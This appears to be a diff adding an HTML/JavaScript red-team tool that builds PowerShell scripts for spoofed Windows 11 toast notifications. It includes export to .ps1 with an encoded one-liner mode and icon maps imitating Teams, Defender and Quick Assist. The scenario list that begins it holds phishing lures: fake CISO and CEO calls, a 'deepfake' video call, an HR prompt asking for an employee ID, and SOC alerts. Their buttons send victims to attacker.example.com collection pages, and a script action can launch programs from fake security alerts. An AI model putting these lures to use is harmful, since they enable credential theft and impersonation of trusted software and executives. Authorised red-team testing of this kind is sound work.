+      <button class="mob-crumb-back" onclick="mobSwitch('scenarios')">
+        <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M9 2L4 7l5 5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Scenarios
+      </button>
+      <span class="mob-crumb-label" id="mobCrumbLabel">—</span>
+    </div>
+    <div class="ed-tabs">
+      <div class="ed-tab active" onclick="showTab('form',this)">Editor</div>
+      <div class="ed-tab" onclick="showTab('xml',this)">XML</div>
+    </div>
+
+    <!-- FORM -->
+    <div class="ed-body" id="tab-form">
+
+      <div class="form-section">
+        <div class="sec-hdr"><div class="sec-icon"><svg width="10" height="10" viewBox="0 0 10 10" fill="none"><rect x="1" y="1" width="8" height="8" rx="1.5" stroke="var(--accent)" stroke-width="1"/><path d="M3 5h4M3 3h2" stroke="var(--accent)" stroke-width=".9" stroke-linecap="round"/></svg></div><div class="sec-label">Identity</div></div>
+        <div class="field-group">
+          <div class="row2">
+            <div class="field">
+              <label>AUMID</label>
+              <input type="text" id="f-aumid" oninput="sync()" placeholder="MSEdge">
+            </div>
+            <div class="field">
+              <label>Scenario type</label>
+              <select id="f-scenario" onchange="sync()">
+                <option value="default">default</option>
+                <option value="urgent">urgent</option>
+                <option value="reminder">reminder</option>
+                <option value="alarm">alarm</option>
+                <option value="incomingCall">incomingCall</option>
+              </select>
+            </div>
+          </div>
+          <div class="field">
+            <label>Scenario label</label>
+            <input type="text" id="f-label" oninput="sync()" placeholder="Name this scenario">
+          </div>
+          <div class="field">
+            <label>Payload type</label>
+            <select id="f-payload" onchange="syncPayload()" style="background:var(--panel);border:1px solid var(--border2);border-radius:6px;padding:7px 10px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.72rem;outline:none;width:100%">
+              <option value="URL / Protocol">🔗 URL / Protocol</option>
+              <option value="Execute Script">⚡ Execute Script / Program</option>
+            </select>
+          </div>
+        </div>
+      </div>
+
+      <div class="form-section">
+        <div class="sec-hdr"><div class="sec-icon"><svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M2 2h6M2 4.5h6M2 7h4" stroke="var(--accent)" stroke-width=".9" stroke-linecap="round"/></svg></div><div class="sec-label">Content</div></div>
+        <div class="field-group">
+          <div class="field"><label>Title</label><input type="text" id="f-title" oninput="sync()"></div>
+          <div class="field"><label>Body</label><textarea id="f-body" oninput="sync()"></textarea></div>
+          <div class="row2">
+            <div class="field"><label>Attribution</label><input type="text" id="f-attr" placeholder="e.g. Microsoft Teams" oninput="sync()"></div>
+            <div class="field"><label>App logo path</label><input type="text" id="f-logo" placeholder="C:\Users\Public\..." oninput="sync()"></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="form-section">
+        <div class="sec-hdr"><div class="sec-icon"><svg width="10" height="10" viewBox="0 0 10 10" fill="none"><rect x="1" y="3" width="8" height="4" rx="1" stroke="var(--accent)" stroke-width=".9"/><path d="M3 5h1" stroke="var(--accent)" stroke-width=".9" stroke-linecap="round"/></svg></div><div class="sec-label">User Input <span style="font-size:.58rem;color:var(--text3);text-transform:none;letter-spacing:0;font-weight:400">optional</span></div></div>
+        <div class="block">
+          <div class="block-title">
+            Input element
+            <label class="toggle-row" onclick="toggleInput()">
+              <div class="sw" id="inputSw"></div>
+              <span id="inputLbl">off</span>
+            </label>
+          </div>
+          <div id="inputFields" style="display:none;display:flex;flex-direction:column;gap:10px">
+            <div class="row2">
+              <div class="field">
+                <label>Type</label>
+                <select id="f-itype" onchange="sync()">
+                  <option value="text">Text input</option>
+                  <option value="selection">Dropdown</option>
+                </select>
+              </div>
+              <div class="field">
+                <label>Placeholder / title</label>
+                <input type="text" id="f-iph" oninput="sync()">
+              </div>
+            </div>
+            <div id="selOpts" style="display:none">
+              <div class="field">
+                <label>Options — one per line: <code style="color:var(--accent)">id|Label</code></label>
+                <textarea id="f-sels" rows="3" placeholder="p1|P1 — Critical&#10;p2|P2 — High" oninput="sync()"></textarea>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="form-section">
+        <div class="sec-hdr"><div class="sec-icon"><svg width="10" height="10" viewBox="0 0 10 10" fill="none"><rect x="1" y="3" width="3.5" height="4" rx="1" stroke="var(--accent)" stroke-width=".9"/><rect x="5.5" y="3" width="3.5" height="4" rx="1" stroke="var(--accent)" stroke-width=".9"/></svg></div><div class="sec-label">Action Buttons</div></div>
+        <div class="block">
+          <div class="block-title">Button 1 (primary)</div>
+          <div class="field"><label>Label</label><input type="text" id="f-a1t" oninput="sync()"></div>
+          <div class="pill-row" id="p1row">
+            <div class="pill on" data-type="url"      onclick="setAt(1,'url',this)">URL</div>
+            <div class="pill"    data-type="protocol" onclick="setAt(1,'protocol',this)">Protocol</div>
+            <div class="pill"    data-type="script"   onclick="setAt(1,'script',this)">Script</div>
+            <div class="pill"    data-type="dismiss"  onclick="setAt(1,'dismiss',this)">Dismiss</div>
+          </div>
+          <div class="field">
+            <label id="a1lbl">URL</label>
+            <input type="text" id="f-a1u" oninput="sync()">
+            <div class="field-hint" id="a1hint"></div>
+          </div>
+        </div>
+
+        <div class="block" style="margin-top:8px">
+          <div class="block-title">
+            Button 2
+            <label class="toggle-row" onclick="toggleB2()">
+              <div class="sw on" id="b2sw"></div>
+              <span id="b2lbl">on</span>
+            </label>
+          </div>
+          <div id="b2fields" style="display:flex;flex-direction:column;gap:10px">
+            <div class="field"><label>Label</label><input type="text" id="f-a2t" oninput="sync()"></div>
+            <div class="pill-row" id="p2row">
+              <div class="pill"    data-type="url"      onclick="setAt(2,'url',this)">URL</div>
+              <div class="pill"    data-type="protocol" onclick="setAt(2,'protocol',this)">Protocol</div>
+              <div class="pill"    data-type="script"   onclick="setAt(2,'script',this)">Script</div>
+              <div class="pill on" data-type="dismiss"  onclick="setAt(2,'dismiss',this)">Dismiss</div>
+            </div>
+            <div class="field">
+              <label id="a2lbl">Argument</label>
+              <input type="text" id="f-a2u" oninput="sync()" disabled style="opacity:.3">
+              <div class="field-hint" id="a2hint"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- XML -->
+    <div class="ed-body hidden" id="tab-xml" style="flex:1">
+      <div class="xml-wrap" style="flex:1">
+        <div class="xml-acts">
+          <button class="xml-btn hi" onclick="applyXml()">↑ Apply XML</button>
+          <button class="xml-btn" onclick="fmtXml()">Format</button>
+          <button class="xml-btn" onclick="validateXml()">Validate</button>
+          <button class="xml-btn" onclick="resetXml()">↺ Reset</button>
+          <button class="xml-btn" onclick="copyXml()">Copy</button>
+        </div>
+        <div class="xml-msg" id="xmlMsg"></div>
+        <textarea class="xml-textarea" id="xmlEd" spellcheck="false" oninput="xmlDirty=true" style="flex:1;min-height:0;height:100%"></textarea>
+      </div>
+    </div>
+
+    <!-- MOBILE ONLY: action bar at bottom of editor -->
+    <div class="mob-editor-bar" id="mobEditorBar">
+      <button class="mob-action-btn mob-action-preview" style="flex:1;background:var(--accent);border-color:var(--accent);color:#fff;font-size:.8rem;padding:13px" onclick="mobSwitch('preview')">
+        View Output &amp; Preview
+        <svg width="14" height="14" viewBox="0 0 12 12" fill="none"><path d="M4 2l4 4-4 4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </button>
+    </div>
+  </div>
+
+  <div class="resizer" id="resizerRight" title="Drag to resize · Double-click to reset"></div>
+
+  <!-- RIGHT PANEL -->
+  <div class="right" id="panelRight">
+    <!-- MOBILE: back button bar -->
+    <div class="mob-back-bar" id="mobBackBar">
+      <button class="mob-back-btn" onclick="mobSwitch('editor')">
+        <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M8 2L4 6l4 4" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Editor
+      </button>
+      <span class="mob-back-label" style="font-size:.72rem;font-weight:700;color:var(--text)">Output</span>
+      <button class="mob-back-btn" onclick="mobSwitch('scenarios')" style="color:var(--text2)">
+        Scenarios
+        <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M4 2l4 4-4 4" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </button>
+    </div>
+    <div class="right-hdr"><svg width="12" height="12" viewBox="0 0 12 12" fill="none"><rect x="1" y="1" width="10" height="8" rx="1.5" stroke="currentColor" stroke-width="1"/><path d="M4 11h4M6 9v2" stroke="currentColor" stroke-width="1" stroke-linecap="round"/></svg> Preview &amp; Output</div>
+
+    <!-- TOAST PREVIEW — fixed height, scrolls internally if needed -->
+    <div style="flex-shrink:0;padding:12px;border-bottom:1px solid var(--border);overflow-y:auto">
+      <div class="win-notif-area">
+        <div class="win-notif-area-label">Windows 11 — Notification Center</div>
+        <div class="toast-w11" id="toastW11">
+          <div class="toast-w11-bar"></div>
+
+          <!-- standard layout -->
+          <div id="tw-standard">
+            <div class="toast-w11-inner">
+              <div class="tw-approw">
+                <div class="tw-appicon" id="tw-icon">
+                  <svg width="16" height="16" viewBox="0 0 16 16"><rect width="16" height="16" rx="3" fill="#7a8faf"/></svg>
+                </div>
+                <div class="tw-appname" id="tw-appname">Application</div>
+                <div class="tw-time" id="tw-time">now</div>
+                <div class="tw-close">✕</div>
+              </div>
+              <div class="tw-title" id="tw-title">Title</div>
+              <div class="tw-body" id="tw-body">Body text</div>
+              <div class="tw-attribution" id="tw-attr" style="display:none"></div>
+              <div class="tw-input" id="tw-input" style="display:none">
+                <div class="tw-input-text" id="tw-input-ph">Enter message…</div>
+                <div class="tw-input-send">→</div>
+              </div>
+              <div class="tw-select" id="tw-sel" style="display:none">
+                <div class="tw-select-val" id="tw-sel-val">Option 1</div>
+                <div class="tw-select-arrow">▾</div>
+              </div>
+            </div>
+            <div class="tw-buttons" id="tw-btns"></div>
+          </div>
+
+          <!-- incomingCall layout -->
+          <div id="tw-call" style="display:none">
+            <div class="tw-call-body">
+              <div class="tw-avatar" id="tw-avatar">👤</div>
+              <div class="tw-call-info">
+                <div class="tw-title" id="tw-call-title">Caller Name</div>
+                <div class="tw-body" id="tw-call-sub">Incoming call</div>
+              </div>
+            </div>
+            <div class="tw-call-btns">
+              <div class="tw-call-btn answer" id="tw-call-ans">Answer</div>
+              <div class="tw-call-btn decline" id="tw-call-dec">Decline</div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <!-- PS OUTPUT — fills all remaining space between preview and gen-area -->
+    <div class="out-section" id="outSection">
+      <div class="out-hdr">
+        <div class="out-label">
+          <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><rect x="1" y="1" width="9" height="9" rx="2" stroke="currentColor" stroke-width="1"/><path d="M3 4l2 1.5L3 7" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"/><path d="M6.5 7h2" stroke="currentColor" stroke-width="1" stroke-linecap="round"/></svg>
+          PowerShell Output
+        </div>
+        <div class="out-actions">
+          <button class="out-font-btn" id="onelineBtn" onclick="toggleOneliner()" title="Toggle one-liner encoded mode" style="width:auto;padding:0 7px;font-size:.58rem;letter-spacing:.2px">1-liner</button>
+          <div style="width:1px;height:14px;background:var(--border2);margin:0 1px"></div>
+          <button class="out-font-btn" onclick="psFont(-1)" title="Decrease font size">A−</button>
+          <button class="out-font-btn" onclick="psFont(0)" title="Reset font size">A</button>
+          <button class="out-font-btn" onclick="psFont(1)" title="Increase font size">A+</button>
+        </div>
+      </div>
+      <pre class="ps-out" id="psOut"># Select a scenario</pre>
+    </div>
+
+    <div class="gen-area">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px">
+        <button class="g-btn main" id="copyBtn" onclick="copyOut()">
+          <svg width="12" height="12" viewBox="0 0 11 11" fill="none"><rect x="1" y="3" width="7" height="7" rx="1.2" stroke="currentColor" stroke-width="1.2"/><path d="M3 3V2a1 1 0 011-1h5a1 1 0 011 1v6a1 1 0 01-1 1H8" stroke="currentColor" stroke-width="1.2"/></svg>
+          <span id="copyBtnLabel">Copy .ps1</span>
+        </button>
+        <button class="g-btn sec" id="saveBtn" onclick="handleSave()">
+          <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M6 1v7M3 6l3 2 3-2M2 10h8" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          <span id="saveBtnLabel">Save .ps1</span>
+        </button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- EXPORT MODAL -->
+<div class="overlay" id="exportOverlay" onclick="closeOverlay(event,'exportOverlay')">
+  <div class="modal">
+    <h2 id="m-title">Export Script</h2>
+    <div class="modal-sub" id="m-sub">—</div>
+    <div class="field" style="margin-bottom:10px">
+      <label style="font-size:.7rem;color:var(--sub);font-weight:500;margin-bottom:4px;display:block">Filename</label>
+      <div style="display:flex;gap:6px;align-items:center">
+        <input type="text" id="m-fname" oninput="updateFnPreview()" onkeydown="if(event.key==='Enter')doExport()" style="flex:1;background:var(--bg);border:1px solid var(--border2);border-radius:6px;padding:7px 10px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.72rem;outline:none">
+        <span style="font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--sub)">.ps1</span>
+      </div>
+    </div>
+    <div class="modal-preview" id="m-preview">—</div>
+    <label class="modal-opt" onclick="toggleUid()">
+      <div class="sw on" id="uidSw"></div>
+      Append random UID
+    </label>
+    <div class="modal-btns">
+      <button class="m-btn cancel" onclick="document.getElementById('exportOverlay').classList.remove('show')">Cancel</button>
+      <button class="m-btn confirm" onclick="doExport()">⬇ Download .ps1</button>
+    </div>
+  </div>
+</div>
+
+<div class="feedback" id="fb"></div>
+
+<!-- ADVANCED MODAL -->
+<div class="overlay" id="advOverlay" onclick="closeOverlay(event,'advOverlay')">
+  <div class="modal">
+    <h2>Advanced Options</h2>
+    <div class="modal-sub">Bulk export and global settings</div>
+    <div style="display:flex;flex-direction:column;gap:8px;margin-top:4px">
+      <button onclick="promptExport('all');document.getElementById('advOverlay').classList.remove('show')" style="padding:10px;border-radius:7px;border:1px solid var(--border2);background:var(--panel2);color:var(--text);font-size:.78rem;font-weight:600;cursor:pointer;text-align:left;display:flex;align-items:center;gap:8px;transition:border-color .15s" onmouseover="this.style.borderColor='var(--accent)'" onmouseout="this.style.borderColor='var(--border2)'">
+        <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M7 1v9M4 8l3 2 3-2M2 12h10" stroke="var(--accent)" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <div><div style="font-size:.78rem">Export All 25 Scenarios</div><div style="font-size:.62rem;color:var(--sub);margin-top:1px">Generates a single .ps1 with all scenarios bundled</div></div>
+      </button>
+      <button onclick="dupScenario();document.getElementById('advOverlay').classList.remove('show')" style="padding:10px;border-radius:7px;border:1px solid var(--border2);background:var(--panel2);color:var(--text);font-size:.78rem;font-weight:600;cursor:pointer;text-align:left;display:flex;align-items:center;gap:8px;transition:border-color .15s" onmouseover="this.style.borderColor='var(--accent)'" onmouseout="this.style.borderColor='var(--border2)'">
+        <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><rect x="1" y="4" width="8" height="9" rx="1.2" stroke="var(--sub)" stroke-width="1.2"/><path d="M4 4V2.2A1.2 1.2 0 015.2 1h6.6A1.2 1.2 0 0113 2.2v6.6A1.2 1.2 0 0111.8 10H10" stroke="var(--sub)" stroke-width="1.2"/></svg>
+        <div><div style="font-size:.78rem">Duplicate Current Scenario</div><div style="font-size:.62rem;color:var(--sub);margin-top:1px">Clone the active scenario as a custom editable copy</div></div>
+      </button>
+      <button onclick="newScenario();document.getElementById('advOverlay').classList.remove('show')" style="padding:10px;border-radius:7px;border:1px solid var(--border2);background:var(--panel2);color:var(--text);font-size:.78rem;font-weight:600;cursor:pointer;text-align:left;display:flex;align-items:center;gap:8px;transition:border-color .15s" onmouseover="this.style.borderColor='var(--accent)'" onmouseout="this.style.borderColor='var(--border2)'">
+        <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M7 2v10M2 7h10" stroke="var(--green)" stroke-width="1.3" stroke-linecap="round"/></svg>
+        <div><div style="font-size:.78rem">New Custom Scenario</div><div style="font-size:.62rem;color:var(--sub);margin-top:1px">Create a blank scenario from scratch</div></div>
+      </button>
+    </div>
+    <div class="modal-btns" style="margin-top:14px">
+      <button class="m-btn cancel" onclick="document.getElementById('advOverlay').classList.remove('show')">Close</button>
+    </div>
+  </div>
+</div>
+
+<script>
+// ─── APP ICON MAP ──────────────────────────────────────────────
+// Real Win11 app icon colors per AUMID/app
+const APP_ICONS = {
+  'Teams'       :{bg:'#464775',fg:'#fff',emoji:'T',label:'Microsoft Teams'},
+  'Zoom'        :{bg:'#2d8cff',fg:'#fff',emoji:'Z',label:'Zoom'},
+  'Chrome'      :{bg:'#fff',fg:'#4285f4',emoji:'G',label:'Google Chrome'},
+  'Defender'    :{bg:'#0078d4',fg:'#fff',emoji:'🛡',label:'Windows Security'},
+  'Copilot'     :{bg:'#000',fg:'#7ec8e3',emoji:'✦',label:'Microsoft Copilot'},
+  'OneDrive'    :{bg:'#0078d4',fg:'#fff',emoji:'☁',label:'Microsoft OneDrive'},
+  'Office Hub'  :{bg:'#d83b01',fg:'#fff',emoji:'O',label:'Microsoft 365'},
+  'Windows Store':{bg:'#0078d4',fg:'#fff',emoji:'⊞',label:'Microsoft Store'},
+  'Quick Assist':{bg:'#005a9e',fg:'#fff',emoji:'⬡',label:'Quick Assist'},
+  'Phone Link'  :{bg:'#0078d4',fg:'#fff',emoji:'📱',label:'Phone Link'},
+  'Slack'       :{bg:'#611f69',fg:'#fff',emoji:'S',label:'Slack'},
+  'Proton Mail' :{bg:'#6d4aff',fg:'#fff',emoji:'⊛',label:'Proton Mail'},
+  'VS Code'     :{bg:'#007acc',fg:'#fff',emoji:'{ }',label:'Visual Studio Code'},
+  'Remote Desktop':{bg:'#0078d4',fg:'#fff',emoji:'⎕',label:'Remote Desktop'},
+  'Windows Terminal':{bg:'#1d2021',fg:'#c5c5c5',emoji:'>_',label:'Windows Terminal'},
+  'Xbox / Gaming':{bg:'#107c10',fg:'#fff',emoji:'🎮',label:'Xbox'},
+  'Custom'      :{bg:'#333',fg:'#aaa',emoji:'?',label:'Custom App'},
+};
+function getIcon(app){ return APP_ICONS[app] || {bg:'#333',fg:'#e0e0e0',emoji:'●',label:app}; }
+
+// Which action types each app actually supports for red team use
+// All support URL (https via protocol activationType) and Dismiss (system)
+// Protocol: apps with known deep-link URI schemes
+// Script: apps where launching a process is plausible to the user
+const APP_ACTION_SUPPORT = {
+  'Teams':          {url:true, protocol:true,  script:false, dismiss:true,  note:'ms-teams:// URI'},
+  'Zoom':           {url:true, protocol:true,  script:false, dismiss:true,  note:'zoommtg:// URI'},
+  'Chrome':         {url:true, protocol:false, script:false, dismiss:true,  note:'URL redirect only'},
+  'Defender':       {url:true, protocol:false, script:true,  dismiss:true,  note:'Can launch remediation scripts'},
+  'Copilot':        {url:true, protocol:false, script:false, dismiss:true,  note:'URL redirect only'},
+  'OneDrive':       {url:true, protocol:false, script:false, dismiss:true,  note:'URL redirect only'},
+  'Office Hub':     {url:true, protocol:true,  script:false, dismiss:true,  note:'ms-office:// URI'},
+  'Windows Store':  {url:true, protocol:true,  script:false, dismiss:true,  note:'ms-windows-store:// URI'},
+  'Quick Assist':   {url:true, protocol:true,  script:false, dismiss:true,  note:'ms-quick-assist:// URI'},
+  'Phone Link':     {url:true, protocol:false, script:false, dismiss:true,  note:'URL redirect only'},
+  'Slack':          {url:true, protocol:true,  script:false, dismiss:true,  note:'slack:// URI'},
+  'Proton Mail':    {url:true, protocol:false, script:false, dismiss:true,  note:'URL redirect only'},
+  'VS Code':        {url:true, protocol:true,  script:true,  dismiss:true,  note:'vscode:// URI or script'},
+  'Remote Desktop': {url:true, protocol:true,  script:false, dismiss:true,  note:'rdp:// URI'},
+  'Windows Terminal':{url:true,protocol:false, script:true,  dismiss:true,  note:'Script/executable launch'},
+  'Xbox / Gaming':  {url:true, protocol:true,  script:false, dismiss:true,  note:'ms-xbl-id:// URI'},
+  'Custom':         {url:true, protocol:true,  script:true,  dismiss:true,  note:'All types available'},
+};
+function getActionSupport(app){ return APP_ACTION_SUPPORT[app] || {url:true,protocol:true,script:true,dismiss:true,note:''}; }
+// Custom SVG icon paths per app
+const APP_SVG_PATHS = {
+  'Teams': `<rect width="16" height="16" rx="3" fill="#464775"/>
+    <path d="M10 5.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0z" fill="#fff"/>
+    <path d="M5 9c0-1.1.9-2 2-2h2a2 2 0 012 2v.5H5V9z" fill="#fff"/>
+    <path d="M11.5 7a1 1 0 100-2 1 1 0 000 2z" fill="#bbb"/>
+    <path d="M11 8.5h1.5A1.5 1.5 0 0114 10v.5h-3V8.5z" fill="#bbb"/>`,
+
+  'Zoom': `<rect width="16" height="16" rx="3" fill="#2d8cff"/>
+    <path d="M3 6.5a1 1 0 011-1h5a1 1 0 011 1v3a1 1 0 01-1 1H4a1 1 0 01-1-1v-3z" fill="#fff"/>
+    <path d="M10 8l3-2v4l-3-2z" fill="#fff"/>`,
+
+  'Chrome': `<rect width="16" height="16" rx="3" fill="#fff"/>
+    <circle cx="8" cy="8" r="3" fill="#4285f4"/>
+    <path d="M8 5h5.2A5 5 0 018 13V5z" fill="#ea4335"/>
+    <path d="M8 5H2.8A5 5 0 005.5 12.3L8 5z" fill="#fbbc04"/>
+    <path d="M5.5 12.3A5 5 0 0013.2 5H8l-2.5 7.3z" fill="#34a853"/>
+    <circle cx="8" cy="8" r="2" fill="#fff"/>`,
+
+  'Defender': `<rect width="16" height="16" rx="3" fill="#0078d4"/>
+    <path d="M8 3L4 5v3c0 2.2 1.7 4.2 4 4.9 2.3-.7 4-2.7 4-4.9V5L8 3z" fill="#fff" opacity=".9"/>
+    <path d="M6.5 8l1 1 2-2" stroke="#0078d4" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>`,
+
+  'Copilot': `<rect width="16" height="16" rx="3" fill="#1a1a2e"/>
+    <path d="M8 4c2.2 0 4 1.8 4 4s-1.8 4-4 4-4-1.8-4-4 1.8-4 4-4z" fill="none" stroke="#7ec8e3" stroke-width="1"/>
+    <path d="M8 6.5c.8 0 1.5.7 1.5 1.5S8.8 9.5 8 9.5 6.5 8.8 6.5 8 7.2 6.5 8 6.5z" fill="#7ec8e3"/>
+    <path d="M8 4v1M8 11v1M4 8h1M11 8h1" stroke="#7ec8e3" stroke-width=".8" stroke-linecap="round"/>`,
+
+  'OneDrive': `<rect width="16" height="16" rx="3" fill="#0078d4"/>
+    <path d="M4 10.5c0-1 .6-1.8 1.5-2.1A2.5 2.5 0 019.5 6c.7 0 1.4.3 1.9.8A2 2 0 0113 8.5a2 2 0 010 4H5a1 1 0 01-1-2z" fill="#fff" opacity=".9"/>`,
+
+  'Office Hub': `<rect width="16" height="16" rx="3" fill="#d83b01"/>
+    <path d="M4 4h5v8L4 11V4z" fill="#fff" opacity=".9"/>
+    <path d="M9 5.5h3v5H9" fill="#fff" opacity=".6"/>`,
+
+  'Windows Store': `<rect width="16" height="16" rx="3" fill="#0078d4"/>
+    <rect x="3" y="3" width="4" height="4" rx=".5" fill="#fff"/>
+    <rect x="9" y="3" width="4" height="4" rx=".5" fill="#fff" opacity=".7"/>
+    <rect x="3" y="9" width="4" height="4" rx=".5" fill="#fff" opacity=".7"/>
+    <rect x="9" y="9" width="4" height="4" rx=".5" fill="#fff" opacity=".5"/>`,
+
+  'Quick Assist': `<rect width="16" height="16" rx="3" fill="#005a9e"/>
+    <path d="M8 4a4 4 0 100 8A4 4 0 008 4z" fill="none" stroke="#fff" stroke-width="1"/>
+    <path d="M8 7c.6 0 1-.4 1-1s-.4-1-1-1-1 .4-1 1 .4 1 1 1z" fill="#fff"/>
+    <path d="M8 9v2" stroke="#fff" stroke-width="1.2" stroke-linecap="round"/>`,
+
+  'Phone Link': `<rect width="16" height="16" rx="3" fill="#0078d4"/>
+    <rect x="6" y="3" width="4" height="7" rx="1" fill="none" stroke="#fff" stroke-width="1"/>
+    <path d="M7.5 8.5h1" stroke="#fff" stroke-width="1" stroke-linecap="round"/>
+    <path d="M3 10h3M10 10h3" stroke="#fff" stroke-width=".8" stroke-linecap="round"/>`,
+
+  'Slack': `<rect width="16" height="16" rx="3" fill="#611f69"/>
+    <path d="M6 5a1 1 0 00-2 0v3a1 1 0 002 0V5z" fill="#e01e5a"/>
+    <path d="M9 5a1 1 0 00-2 0v3a1 1 0 002 0V5z" fill="#36c5f0"/>
+    <path d="M11 7a1 1 0 000 2h-6a1 1 0 000-2h6z" fill="#2eb67d"/>
+    <path d="M6 9a1 1 0 000 2h3a1 1 0 000-2H6z" fill="#ecb22e"/>`,
+
+  'Proton Mail': `<rect width="16" height="16" rx="3" fill="#6d4aff"/>
+    <path d="M3 5.5l5 3.5 5-3.5V11H3V5.5z" fill="none" stroke="#fff" stroke-width="1"/>
+    <path d="M3 5.5h10L8 9 3 5.5z" fill="#fff" opacity=".9"/>`,
+
+  'VS Code': `<rect width="16" height="16" rx="3" fill="#007acc"/>
+    <path d="M11 3L6.5 7.5 4 5.5 3 6.5 6.5 10 3 13.5l1 1 2.5-2 4.5 4.5 2-1V4l-2-1z" fill="#fff" opacity=".9"/>`,
+
+  'Remote Desktop': `<rect width="16" height="16" rx="3" fill="#0078d4"/>
+    <rect x="3" y="4" width="10" height="7" rx="1" fill="none" stroke="#fff" stroke-width="1"/>
+    <path d="M6 13h4M8 11v2" stroke="#fff" stroke-width="1" stroke-linecap="round"/>`,
+
+  'Windows Terminal': `<rect width="16" height="16" rx="3" fill="#1d2021"/>
+    <path d="M3 6l3 2-3 2" stroke="#c5c5c5" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
+    <path d="M8 10h5" stroke="#c5c5c5" stroke-width="1.2" stroke-linecap="round"/>`,
+
+  'Xbox / Gaming': `<rect width="16" height="16" rx="3" fill="#107c10"/>
+    <circle cx="8" cy="8" r="4" fill="none" stroke="#fff" stroke-width=".8"/>
+    <path d="M5.5 8c.5-1 2.5-3 2.5-3s2 2 2.5 3-1 2.5-2.5 2.5S5 9 5.5 8z" fill="#fff" opacity=".9"/>`,
+
+  'Custom': `<rect width="16" height="16" rx="3" fill="#2a2f44"/>
+    <path d="M8 4v8M4 8h8" stroke="#6b7490" stroke-width="1.5" stroke-linecap="round"/>`,
+};
+
+function iconSvg(app){
+  const ic = getIcon(app);
+  const paths = APP_SVG_PATHS[app] || `<rect width="16" height="16" rx="3" fill="${ic.bg}"/><text x="8" y="12" text-anchor="middle" font-size="8" font-family="monospace" font-weight="700" fill="${ic.fg}">${(app||'?')[0].toUpperCase()}</text>`;
+  return `<svg width="16" height="16" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">${paths}</svg>`;
+}
+
+// ─── DATA ────────────────────────────────────────────────────
+const SCENARIOS=[
+  {id:'T01',payload:'URL / Protocol',num:'01',app:'Teams',name:'Incoming Call — CISO',aumid:'MSTeams_8wekyb3d8bbwe!MSTeams',scenario:'incomingCall',tech:'Impersonation',title:'CISO — Robert Anderson',body:'Incoming call · Microsoft Teams',attribution:'',logo:'C:\\Users\\Public\\Pictures\\ciso.jpg',hasInput:true,inputType:'text',inputPlaceholder:'Send a message...',selections:'',a1text:'Answer',a1type:'url',a1arg:'https://attacker.example.com/call',a2:true,a2text:'Decline',a2type:'dismiss',a2arg:'dismiss'},
+  {id:'T02',payload:'URL / Protocol',num:'02',app:'Teams',name:'SOC Incident Selector',aumid:'MSTeams_8wekyb3d8bbwe!MSTeams',scenario:'urgent',tech:'SOC Phishing',title:'Active Incident — IR-2024-0047',body:'Lateral movement detected on DC01. Join the immediate response room.',attribution:'',logo:'',hasInput:true,inputType:'selection',inputPlaceholder:'Priority level',selections:'p1|P1 — Critical\np2|P2 — High\np3|P3 — Medium',a1text:'Join crisis room',a1type:'url',a1arg:'https://attacker.example.com/ir-room',a2:true,a2text:'Escalate',a2type:'url',a2arg:'https://attacker.example.com/escalate'},
+  {id:'T03',payload:'URL / Protocol',num:'03',app:'Teams',name:'HR Message — Text Input',aumid:'MSTeams_8wekyb3d8bbwe!MSTeams',scenario:'default',tech:'Credential Phishing',title:'Human Resources · Teams',body:'To complete your enrollment in the new payroll system, please confirm your employee ID.',attribution:'',logo:'',hasInput:true,inputType:'text',inputPlaceholder:'Enter your employee ID...',selections:'',a1text:'Confirm',a1type:'url',a1arg:'https://attacker.example.com/collect',a2:true,a2text:'Later',a2type:'dismiss',a2arg:'dismiss'},
+  {id:'T04',payload:'URL / Protocol',num:'04',app:'Teams',name:'Urgent Meeting Invite',aumid:'MSTeams_8wekyb3d8bbwe!MSTeams',scenario:'default',tech:'Lateral Movement',title:'Q4 Budget Review — In Progress',body:'Meeting started 8 minutes ago. The CEO is waiting for you to join.',attribution:'Microsoft Teams',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Join now',a1type:'url',a1arg:'https://attacker.example.com/meeting/q4',a2:true,a2text:'Decline',a2type:'dismiss',a2arg:'dismiss'},
+  {id:'T05',payload:'URL / Protocol',num:'05',app:'Teams',name:'Deepfake Video Call',aumid:'MSTeams_8wekyb3d8bbwe!MSTeams',scenario:'incomingCall',tech:'Vishing / Deepfake',title:'CEO — Sophia Williams',body:'Incoming video call · Urgent',attribution:'',logo:'C:\\Users\\Public\\Pictures\\ceo.jpg',hasInput:true,inputType:'text',inputPlaceholder:'Message...',selections:'',a1text:'Answer video call',a1type:'url',a1arg:'https://attacker.example.com/deepfake-call',a2:true,a2text:'Decline',a2type:'dismiss',a2arg:'dismiss'},
